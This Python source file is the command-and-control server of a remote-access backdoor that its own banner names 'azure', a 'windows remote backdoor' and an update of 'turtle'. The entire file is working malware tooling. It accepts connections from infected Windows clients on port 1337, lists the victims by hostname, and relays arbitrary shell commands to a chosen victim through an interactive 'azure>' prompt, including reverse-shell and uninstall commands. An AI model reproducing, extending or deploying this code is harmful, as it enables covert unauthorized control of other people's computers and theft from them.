import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal
import os
import ctypes


threads = 2
jnum = [1, 2]
queue = Queue()

COMMANDS = {'\nhelp':['Shows this help'],
            'clear':['Clears the console'],
            'list':['Lists connected clients'],
            'info':['Shows credits'],
            'shell':['Starts reverse shell on client. Usage: shell [id]'],
            'quit':['Stops current connection with a client. To be used when client is selected'],
            'remove':['Deinstalls client. To be used when client is selected'],
            'kill':['Kills the server\n'],
           }

class MultiServer(object):

    def __init__(self):
        self.host = ''
        self.port = 1337
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('a | Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("a | Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("a | Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
        return

    def start_azure(self):
        os.system("clear")
        print("""
              █████╗ ███████╗██╗   ██╗██████╗ ███████╗
             ██╔══██╗╚══███╔╝██║   ██║██╔══██╗██╔════╝
             ███████║  ███╔╝ ██║   ██║██████╔╝█████╗  
             ██╔══██║ ███╔╝  ██║   ██║██╔══██╗██╔══╝  
             ██║  ██║███████╗╚██████╔╝██║  ██║███████╗
             ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                     windows remote backdoor


                        """)
        while True:
            cmd = input('azure> ')
            if cmd == 'list':
                self.list_connections()
                continue
            elif 'shell' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == 'kill':
                    queue.task_done()
                    queue.task_done()
                    print('a | Server shutdown')
                    exit()
            elif cmd == 'help':
                self.print_help()
            
            elif cmd == 'info':
                print("""
                azure backdoor
                an updated version of turtle
                made by vanta
                """)
            elif cmd == 'clear':
                self.start_azure()
            elif cmd == '':
                pass
            else:
                print('a | Command not recognized')
        return

    def list_connections(self):
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('\n|──────────────Clients──────────────|' + '\n' + results)
        return

    def get_target(self, cmd):
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('a | Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('a | Not a valid selection')
            return None, None
        print("a | Connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_target_commands(self, target, conn):
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
            except Exception as e:
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return


def create_workers():
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(threads):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_azure()
        queue.task_done()
    return

def create_jobs():
    for x in jnum:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
